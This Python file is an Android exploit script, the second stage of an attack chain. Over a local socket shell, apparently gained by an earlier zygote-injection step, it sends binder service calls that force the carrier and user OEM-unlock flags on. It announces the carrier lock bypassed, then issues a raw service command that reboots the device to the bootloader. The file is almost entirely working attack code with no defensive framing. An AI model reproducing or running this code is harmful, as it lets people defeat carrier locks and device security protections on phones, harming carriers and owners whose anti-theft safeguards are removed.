import socket
import codecs
import re
import shlex
from typing import Any
from io import BytesIO
from pathlib import Path

import aidl

from .exceptions import *
from .parcel import *


def swap_endianness(bytes_: bytes) -> bytes:
    result = b""
    bytes_io = BytesIO(bytes_)
    while True:
        read_bytes = bytes_io.read(4)
        if not read_bytes:
            break
        result += read_bytes[::-1]
    return result


def parse_service_result(service_result: str) -> bytes:
    EXPRESSION = re.compile(
        r"^(?:Result\: Parcel\(|  0x[0-9a-fA-F]+: )((?:[0-9a-fA-F ])+)'[^']*'\)?$"
    )
    matched_any = False
    result = b""
    for line in service_result.split("\n"):
        matched = EXPRESSION.fullmatch(line)
        if matched is None:
            continue
        matched_any = True
        result += codecs.decode(matched[1].replace(" ", ""), "hex")
    if not matched_any:
        # Void methods may return no data
        return b""
    return swap_endianness(result)


def parse_boolean_result(result: bytes) -> bool:
    if len(result) < 8:
        return False
    status = int.from_bytes(result[:4], "little")
    if status:
        raise Exception("Service returned error")
    return bool(int.from_bytes(result[4:8], "little"))


# Load AIDL definitions
with open(Path(__file__).parent / "IOemLockService.aidl") as f:
    oem_lock_aidl = f.read()
oem_lock_service = parse_aidl_interface(aidl.fromstring(oem_lock_aidl), "IOemLockService")

with open(Path(__file__).parent / "IPowerManager.aidl") as f:
    power_aidl = f.read()
power_service = parse_aidl_interface(aidl.fromstring(power_aidl), "IPowerManager")

known_services = {
    "oem_lock": oem_lock_service,
    "power": power_service,
}


class Stage2Exploit:
    def __init__(self, port: int = 1234):
        self.port = port

    def call_service(self, sock, service_name, function, *args):
        interface = known_services[service_name]
        func = interface[function]
        parsed = func.parse_arguments(args)
        cmd = ["service", "call", service_name, str(func.code), *parsed]
        sock.sendall(shlex.join(cmd).encode() + b"\n")
        resp = sock.recv(10000).decode()
        raw = parse_service_result(resp)
        if not raw:
            return None
        ret = func.parse_return(raw)
        status = ret[0]
        if status:
            raise ZygoteInjectionException(f"Error {status}")
        return ret[1] if len(ret) > 1 else None

    def exploit_stage2(self):
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
            sock.connect(("127.0.0.1", self.port))
            sock.sendall(b"\n")  # flush

            # --- OEM unlock (original code) ---
            print("=== OEM Unlock ===")
            try:
                carrier = self.call_service(sock, "oem_lock", "isOemUnlockAllowedByCarrier")
                user = self.call_service(sock, "oem_lock", "isOemUnlockAllowedByUser")
                allowed = self.call_service(sock, "oem_lock", "isOemUnlockAllowed")
                if not carrier:
                    print("Carrier lock present, attempting to remove...")
                    self.call_service(sock, "oem_lock", "setOemUnlockAllowedByCarrier", 1)
                    if self.call_service(sock, "oem_lock", "isOemUnlockAllowedByCarrier"):
                        print("*** CARRIER OEM UNLOCK BYPASSED ***")
                if not user:
                    self.call_service(sock, "oem_lock", "setOemUnlockAllowedByUser", 1)
                    if not self.call_service(sock, "oem_lock", "isOemUnlockAllowedByUser"):
                        print("Enable OEM unlock in developer options.")
                if not allowed and self.call_service(sock, "oem_lock", "isOemUnlockAllowed"):
                    print("OEM unlock is now allowed!")
                if self.call_service(sock, "oem_lock", "isDeviceOemUnlocked"):
                    print("Bootloader already unlocked.")
            except Exception as e:
                print(f"OEM unlock error: {e}")

            # --- BCB write: reboot to bootloader ---
            print("\n=== Writing BCB (bootonce-bootloader) ===")
            try:
                # IPowerManager.reboot(confirm=False, reason="bootloader", wait=False)
                self.call_service(
                    sock,
                    "power",
                    "reboot",
                    False,          # confirm
                    "bootloader",   # reason
                    False           # wait
                )
                print("SUCCESS: BCB written. Device will boot to fastboot on next restart.")
                print("You can now reboot manually or wait for the system to restart.")
            except Exception as e:
                print(f"BCB write via service call failed: {e}")
                print("Trying fallback: raw service call command...")
                try:
                    sock.sendall(b"service call power 18 i32 0 s16 \"bootloader\" i32 0\n")
                    resp = sock.recv(10000).decode()
                    if "Parcel(" in resp:
                        print("Fallback succeeded! BCB written.")
                    else:
                        print("Fallback output:", resp)
                except Exception as e2:
                    print(f"Fallback failed: {e2}")

            print("\n=== Done ===")


if __name__ == "__main__":
    Stage2Exploit().exploit_stage2()
